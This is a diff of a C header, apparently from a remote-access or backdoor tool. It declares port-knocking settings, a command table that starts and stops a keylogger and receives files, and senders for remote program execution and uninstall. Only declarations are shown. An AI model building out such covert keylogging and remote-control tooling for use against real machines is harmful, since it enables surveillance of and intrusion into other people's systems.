@@ -3,15 +3,13 @@
 
 #include <stddef.h>
 #include <stdint.h>
-#include <stdbool.h>
-
-// Forward declaration to avoid circular dependency
-struct server_options;
 
 #define COMMAND_TRIGGER_THRESHOLD 2
 #define RECEIVING_PORT 8080
 #define PORT_KNOCKING_PORT 30
 #define INITIAL_IP 10
+
+struct server_options;
 
 enum command_codes {
     START_KEYLOGGER = 0x01,
@@ -54,16 +52,20 @@ typedef struct {
     command_handler handler;
 } key_pair;
 
+// Handler Functions
+void start_keylogger(struct session_info * session_info);
+void stop_keylogger(struct session_info * session_info);
+void process_receive_file(struct session_info * session_info);
 
 //  Map of command codes and handler functions
-// static const key_pair command_handler_functions[] = {
-//     { START_KEYLOGGER,  start_keylogger },
-//     { STOP_KEYLOGGER, stop_keylogger },
-//     { RECEIVE_FILE, handle_receive_file },
-//     { 0, NULL }
-// };
+static const key_pair command_handler_functions[] = {
+    { START_KEYLOGGER,  start_keylogger },
+    { STOP_KEYLOGGER, stop_keylogger },
+    { RECEIVE_FILE, process_receive_file },
+    { 0, NULL }
+};
 
-void initiate_port_knocking(struct server_options * server_options);
+void initiate_port_knocking(const struct server_options * server_options);
 
 // Keylogger
 void send_start_keylogger(int fd);
@@ -91,6 +93,7 @@ void send_run_program(int fd);
 void send_uninstall(int fd);
 
 
+void handle_packet_data(struct session_info * session_info, struct packet_data * node);
 
 
 
